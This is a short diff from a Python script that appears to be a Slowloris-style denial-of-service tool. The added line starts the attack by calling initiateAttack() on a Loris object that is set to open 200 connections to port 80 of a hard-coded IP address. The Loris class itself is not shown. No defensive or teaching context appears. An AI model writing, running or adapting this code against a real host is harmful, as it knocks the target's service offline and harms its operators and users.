@@ -129,6 +129,7 @@ class KillableThread(threading.Thread):
 
 def main():
     loris = Loris(addr = "107.150.39.234", port = 80, totalConnections = 200)
+    loris.initiateAttack()
 
 if __name__ == "__main__":
     main()
